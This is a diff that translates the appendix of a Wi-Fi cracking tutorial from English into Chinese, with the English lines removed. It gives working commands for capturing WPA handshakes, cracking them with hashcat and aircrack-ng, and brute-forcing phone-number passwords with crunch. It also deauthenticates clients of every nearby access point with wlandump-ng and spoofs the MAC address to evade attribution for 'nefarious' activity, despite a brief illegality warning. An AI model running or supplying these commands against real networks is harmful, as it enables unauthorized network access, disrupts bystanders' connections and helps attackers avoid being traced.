@@ -1,68 +1,45 @@
-# Appendix
 # 附录
-After the initial release of this tutorial, several people from various corners of the internet reached out with comments and suggestions. In an effort two keep the original tutorial short and sweet, I've included information about their wonderful suggestions here, and added some of my own. Here you will find info on:
 在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：
 
-- Wi-Fi cracking on MacOS/OSX
-- Capturing handshakes with `landump-ng`
-- Generating wordlists with `crunch`
-- Protecting your identity with `macchanger`
 - 在MacOS/OSX上破解WI-FI
 - 利用`landump-ng`捕获握手
 - 利用`crunch`生成单词列表
 - 利用`macchanger`保护你的身份
 
-## Wi-Fi cracking on MacOS/OSX
 ## 在MacOS/OSX上破解WI-FI
 
-Huge thanks to [@harshpatel991](https://github.com/harshpatel991) for contributing this guide. The following explains how to use built-in MacOS/OSX tools to capture a 4-way handshake and naive-hashcat to determine the password of a WPA/WPA2 wireless network. This method has been tested on OSX versions 10.10 and 10.12 but will likely work with other versions as well. Like the main tutorial, it assumes you have a [wireless card](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html) that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode). We've tested this on both Early-2012 and Mid-2015 Macbook Pros with great success.
 非常感谢[@harshpatel991](https://github.com/harshpatel991)提供本指南。以下说明如何使用内置的MacOS/OSX工具捕获4路握手和naive-hashcat来确定WPA/WPA2无线网络的密码。 此方法已在OSX 10.10和10.12版上进行了测试，但也可能与其他版本一起使用。 像主教程一样，它假设你有一个[无线网卡](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)支持[监视模式](https://en.wikipedia.org/wiki/Monitor_mode)。我们已经在2012年上半年和2015年中期MacBook Pro上取得了巨大的成功。
 
-### Wireless Diagnostics tools
 ### 无线诊断工具
 
-Luckily, OSX comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click "Open Wireless Diagnostics..."
 幸运的是，OSX配备了一套无线诊断工具。 要打开它们，请按住键盘上的选项键，然后单击菜单栏中的Wi-Fi图标。 然后点击“打开无线诊断...”
 
-### Determine the channel of your target network
 ### 决定目标网络信道
 
-With Wireless Diagnostics open, click on Window > Scan. Find the target network, note its channel and width.
 打开无线诊断程序，单击窗口>扫描。 找到目标网络，注意其信道和宽度。
 
-### Capture a 4-way Handshake
 ### 捕获一个4路握手
 
-1. With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
-2. Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
-3. Once you think you've got a handshake, click Stop.
-4. The `.wcap` capture file will either be saved to your Desktop or `/var/tmp/` depending on your operating system version.
-5. Convert the capture file to `.hccapx` by uploading it to https://hashcat.net/cap2hccapx/. If you captured any handshakes, the site will start downloading a `.hccapx` file. No download will be prompted if you did not.
 1. 打开无限诊断，点击窗口>嗅探器。选择你在上一步中找到的信道和宽度。
 2. 现在，你需要等待设备连接到目标网络。如果你正在网络上测试（你应该），请重新连接无线设备以捕获握手。
 3. 一旦你认为已经捕获手握手，请点击停止。
 4. 根据你的操作系统版本，`.wcap`捕获文件将被保存到桌面或`/var/tmp/`。
 5.将捕获文件转换为`.hccapx`，将其上传到https://hashcat.net/cap2hccapx/。 如果你捕获到任何握手，站点将开始下载一个`.hccapx`文件。 如果没有，将不会提示下载。
 
-### Crack the password with `naive-hashcat`
 ### 利用`naive-hashcat`破解密码
 
 ```bash
-# clone naive-hashcat
 # 克隆naive-hashcat
 git clone https://github.com/brannondorsey/naive-hashcat
 cd naive-hashcat
 
-# build from source on MacOS/OSX
 # 在MacOS/OSX上构建源代码
 ./build-hashcat-osx.sh
 
-# download the 134MB rockyou dictionary file
 # 下载134MBrockyou字典文件
 curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
 
-Finally, run `naive-hashcat.sh`. Change `handshake.hccapx` to the name of the file you downloaded from [hashcat.net](https://hashcat.net/cap2hccapx/). `cracked.pot` is the name of the output file. 
 最后，运行`naive-hashcat.sh`。将`handshake.hccapx`的名称改成你从[hashcat.net](https://hashcat.net/cap2hccapx/)下载的文件名称。`cracked.pot`是输出文件名称。
 
 ```
@@ -72,49 +49,32 @@ HASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.s
 Thanks again to [@harshpatel991](https://github.com/harshpatel991), as well as [phillips321](http://www.phillips321.co.uk/) for his [post](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/) about building hashcat for OSX.
 再次感谢[@harshpatel991](https://github.com/harshpatel991)，以及感谢[phillips321](http://www.phillips321.co.uk/)他的在OSX上构建hashcat的[帖子](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/)。
 
-## Capturing handshakes with `wlandump-ng`
 ## 利用`wlandump-ng`来捕获握手
 
-[@enilfodne](https://github.com/enilfodne) has [informed me](https://github.com/brannondorsey/wifi-cracking/issues/15) that the hashcat community has a prefered tool for capturing WPA 4-way handshakes, called `wlandump-ng`. This tool belongs to a suite of hashcat related utilities called [hcxtools](https://github.com/ZerBea/hcxtools) developed by [ZerBea](https://github.com/ZerBea), and has notable perks over `airdump-ng`. `wlandump-ng` allows you to blanket capture handshakes from every nearby network at once, hopping Wi-Fi channels in order to increase collection.
 [@enilfodne](https://github.com/enilfodne)已经[告诉我](https://github.com/brannondorsey/wifi-cracking/issues/15)hashcat社区对于捕获WPA 4路握手有了更好的工具，叫做`wlandump-ng`。这个工具属于与hashcat相关的工具集[hcxtools](https://github.com/ZerBea/hcxtools)系列之中，由[ZerBea](https://github.com/ZerBea)开发，名声已经超过了`airdump-ng`。`wlandump-ng`允许你一次性从每个附近的网络上全面捕获握手信息，跳过Wi-Fi信道，以增加收集。
 
 
 ```bash
-# clone hcxtools
 # 克隆hcxtools
 git clone https://github.com/ZerBea/hcxtools
 cd hcxtools
 
-# build and install
 # 构建并且安装
-# you will likely need to apt install the required dependencies:
 # 你将可能需要apt来安装需要的依赖
 # https://github.com/ZerBea/hcxtools#requirements
 make
 sudo make install
 
-# blanket death connected clients from all nearby access points and listen for re-connections
 # 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接
-# replace wlan0 with your wireless device name
 # 将wlan0替换成你的无线设备名称
 wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 
 
-# once you've got a capture file, you can convert it to the hashcat capture format with
 # 一旦你获得了捕获的文件，你可以利用以下命令将其转换成hashcat捕获格式
 cap2hccapx.bin capture.cap capture.hccapx
 ```
 
-`wlandump-ng` command-line args (use `-h` flag for full list):
 `wlandump-ng`命令行参数（使用`h`标志来获得完整列表）：
 
-- `-c 1`: start in the 2.4Ghz range from channel 1 (will go to 13)
-- `-t 60`: stay on each channel for 60s (experiment with lower values, default is `5`)
-- `-d 100`: send deauth every 100 beacon frames
-- `-D 10`: send disassosciation packets every 10 beacons frames
-- `-m 512`: internal ringbuffer size, use 512 for low resource machines
-- `-b`: activate beaconing to last 10 probe requests
-- `-r`: reset deauthentication/disassosciation counter if hop loop is on channel 1
-- `-s 20`: display 20 status lines
 - `-c 1`：从通道1开始的2.4Ghz范围（将转到13）
 - `-t 60'：每个通道停留60s（实验值较低，默认值为5）
 - `-d 100`：发送deauth每100个信标帧
@@ -124,50 +84,39 @@ cap2hccapx.bin capture.cap capture.hccapx
 - `-r`：如果循环在通道1上，则重置deauthentication / detachosciation计数器
 - `-s 20`：显示20条状态行
 
-**WARNING:** Using this is likely illegal in most places. See [here](https://github.com/ZerBea/hcxtools#warning) for more info.
 **警告：**在大多数地方使用这个是不合法的。更多信息请参考[这]((https://github.com/ZerBea/hcxtools#warning)。
 
-`wlandump-ng` also offers the option to run in passive mode without transmitting any deauth/disassociation frames. This is recommended if you are are sensitive to disrupting the network activity of those around you (which you should be). The trade-off is that you will capture far fewer handshakes, but this method makes the capture undetectable.
 `wlandump-ng`也提供了在被动模式下运行的选项，而不会发送任何解除认证/解除关联帧。 如果你对中断你周围的人的网络活动（你应该是）敏感，则建议你这样做。代价是你将获得的握手少得多，这种方法使得捕获不可见。
 
 ```bash
-# run with default settings in passive mode
 # 在被动模式下使用默认设置运行
 wlandump-ng -i wlan0 -o capture.cap -p -s 20 
 ```
 
-## Generating wordlists with `crunch`
 ## 使用`crunch`生成单词列表
 
-`crunch`is a tool to generate wordlists using combinations of a given string or pattern. We can use crunch to generate a password list on-the-fly and pipe it to `aircrack-ng` without having the wordlist saved to disk.
 `crunch`是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用crunch来即时生成密码列表，并将其管理为`aircrack-ng`，而不会将单词列表保存到磁盘。
 
 
 ```bash
-# install crunch
 # 安装crunch
 sudo apt-get install crunch
 ```
 
-To get an idea of how crunch works, run it from the command-line (be ready to press `ctrl-c` once it starts spewing passwords):
 要想知道如何运行crunch，可以从命令行运行（一旦开始发送密码，就可以按`ctrl-c`）：
 
 ```bash
-# syntax 8 8 are min-length and max-length of password to generate
 # 语法8 8是生成密码的最小长度和最大长度
-# 01234567890 is the set of characters to combine/permute to construct the passwords
 # 01234567890是组合/排列构成密码的一组字符
 crunch 8 8 0123456789
 ```
 
 ```
-Crunch will now generate the following amount of data: 900000000 bytes
 Crunch现在将生成以下数据量：900000000字节
 858 MB
 0 GB
 0 TB
 0 PB
-Crunch will now generate the following number of lines: 100000000 
 Crunch现在将生成以下行数：100000000
 00000000
 00000001
@@ -183,54 +132,38 @@ Crunch现在将生成以下行数：100000000
 99999999
 ```
 
-We can pipe the output of `crunch` as the input to `aircrack-ng`, using the passwords that it generates as our wordlist. Here we use the `crunch` special rule character `%` to denote a digit. This command attempts to crack WPA passwords that are 10-digit phone numbers (using 102GB of numbers generated by crunch on-the-fly): 
 我们可以将`crunch`的输出作为输入输出到`aircrack-ng`，使用它生成的密码作为我们的单词列表。 这里我们使用`crunch`特殊规则字符`%`来表示数字。 此命令尝试破解10位电话号码的WPA密码（使用crunch即时生成的102GB的号码）：
 
 ```bash
-# we can also use -t "@^%," to use pattern '@' - replaced with lowercase ',' - replaced with uppercase
 # 我们也可以使用-t "@^%,"  使用模式'@' 替换小写 ',' －替换大写
-# '%' - replaced with numbers and '^' - is replaced with special chars
 # '%' －替换数字以及'^' －替换特殊字符
-# *************** don't forget '-' at the end
 # *************** 不要忘记最后的'-'
 crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
 ```
 
-Thanks to [@hiteshnayak305](https://github.com/hiteshnayak305) for the introduction to `crunch` and including this update as a [PR](https://github.com/brannondorsey/wifi-cracking/pull/17).
 感谢[@hiteshnayak305](https://github.com/hiteshnayak305)介绍`crunch`并将此次更新作为[PR](https://github.com/brannondorsey/wifi-cracking/pull/17)。
 
-## Protecting your identify with `macchanger`
 ## 利用`macchanger`魄户你的身份
 
-Whenever you are doing anything remotely nefarious with Wi-Fi, it is a good idea to spoof your the MAC address of your Wi-Fi device so that any network traffic that gets recorded can't be tied to serial assigned by your device manufacturer.
 每当您使用Wi-Fi进行任何远程恶意攻击时，最好是伪造你的Wi-Fi设备的MAC地址，以便记录的任何网络流量都不能与设备制造商分配的串行连接。
 
-This is trivial with `macchanger`:
 这是利用`macchanger`的一个小尝试：
 
 ```bash
-# download MAC changer
 # 下载MAC changer
 sudo apt-get install macchanger
 
-# bring the device down
 # 关闭设备
 sudo ifconfig wlan0 down
 
-# change the mac
-# -A pics a random MAC w/ a valid vendor
-# -r makes it truly random
-# -p restores it to the original hardware MAC
 # 改变mac
 # -A 为有效的供应商分配一个随机的MAC w/a
 # -r 让它真正随机
 # -p 将其恢复到原始的硬件MAC
 sudo macchanger -A wlan0
 
-# bring the device back up
 # 启动设备
 sudo ifconfig wlan0 up
 ```
 
-If you've got multiple cards, it might also be a good idea to do this to all of them. Or better yet, bring unused wireless interfaces down whenever you are attempting to capture handshakes, to leave as little trace as possible. Note that spoofing changes do not persist across reboots.
 如果你有多张无线网卡，那么改变所有无线网卡的MAC是个好主意。 或者更好的是，当你尝试捕获握手时，将未使用的无线接口关闭，尽可能少地留下痕迹。 请注意，欺骗更改在重新启动时不会持续。
